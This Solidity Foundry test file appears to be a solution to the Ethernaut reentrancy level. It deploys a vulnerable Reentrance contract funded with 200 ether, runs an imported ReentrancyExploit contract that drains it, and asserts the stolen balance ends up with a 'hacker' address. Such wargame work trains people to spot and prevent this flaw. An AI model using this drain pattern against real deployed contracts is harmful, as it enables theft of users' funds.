// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.0;


import "forge-std/Test.sol";
import {Reentrance} from "src/10/Reentrancy.sol";
import {ReentrancyExploit} from "src/10/ReentrancyExploit.sol";

contract ReentrancyTest is Test {

    Reentrance public level;
    ReentrancyExploit public exploit;
    address payable instance = payable(vm.addr(0x10053)); 
    address hacker = vm.addr(0x1337); 
    uint256 initialDeposit = 0.01 ether;
    uint256 initialVictimBalance = 200 ether;

    function setUp() public {
        vm.prank(instance);  
        vm.deal(instance, initialVictimBalance);
        vm.deal(hacker, initialDeposit);

        level = new Reentrance();
        level.donate{value: initialVictimBalance}(instance);
    }

    function testReentrancyHack() public {

        vm.startPrank(hacker);

        exploit = new ReentrancyExploit(level);
        
        /////////////////////////////
        // drain the victim contract
        /////////////////////////////

        assert(hacker.balance == initialDeposit);
        assert(instance.balance == initialVictimBalance);
        assert(address(level).balance == initialVictimBalance);
        assert(address(exploit).balance == 0);

        exploit.run{value: initialDeposit}();
        assert(address(exploit).balance == initialVictimBalance + initialDeposit);
        assert(hacker.balance == 0);

        ///////////////////////////////////////////
        // withdraw from ReentrancyExploit contract
        ///////////////////////////////////////////        
        
        bool success = exploit.withdrawToHacker();
        assert(success);
        assert(hacker.balance == initialVictimBalance + initialDeposit);
        assert(address(exploit).balance == 0);

        vm.stopPrank();
        
    }
}
